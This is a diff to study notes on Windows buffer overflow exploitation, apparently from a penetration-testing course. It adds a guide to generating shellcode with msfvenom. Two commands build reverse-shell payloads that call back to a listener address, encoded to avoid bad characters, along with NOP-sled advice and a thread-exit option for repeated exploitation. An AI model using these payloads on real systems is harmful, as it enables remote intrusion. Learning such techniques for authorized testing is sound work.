@@ -102,10 +102,15 @@ List the payloads:
 Works pretty easily to generate shellcode, except it will contain bad characters such as null bytes. A polymorphic encoder, shikata_ga_nai can be used to encode shellcode and inform the encoder of known bad characters with `-b`.  
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.149 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`  
+(Some will require `-f raw` for a raw output format.)
 
 We have to account for decoding the shellocde. GetPC routines looking ahead mangle some bytes of the decoder itself and crash the target process. Adjusting ESP backwards is another method, or creating a 'landing pad' for the JMP ESP to continue onto the payload. This is done by prepending No OPeration (NOP) instructions. This allows the CPU to slide through the NOPs until the payload is reached. In doing so, the stack pointer is far enough away foom the decoder that it does not corrupt the shellcode when the GetPC routine overwrites a few bytes on the stack.
 
 
+### Improving the Shellcode
+
+We can use the EXITFUNC=threat option to repeatedly exploit a server by only terminating the affected thread instead of the whole application:  
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
 
 
 
